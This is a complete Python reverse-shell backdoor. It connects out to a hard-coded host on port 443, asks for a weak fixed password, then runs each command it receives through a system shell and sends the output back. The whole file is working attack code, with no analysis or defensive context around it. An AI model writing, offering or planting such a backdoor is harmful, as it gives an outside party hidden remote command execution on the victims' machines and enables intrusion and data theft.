#! /usr/bin/python

import subprocess
import socket

host = "192.168.1.128"
port = 443
passwd = "123"

def Login():
	global s
	s.send("Login: ")
	inpasswd = s.recv(1024)
	
	if (inpasswd.strip() == passwd):
		s.send("Connected: ")
		Shell()
	else:
		Login()

def Shell():
	while True:
		data = s.recv(1024)
		if (data == ":kill"):
			break
		
		#Creating subprocces (command)
		proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output = proc.stdout.read() + proc.stderr.read()
		s.send(output)
		s.send("#> ")
		
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
Login()
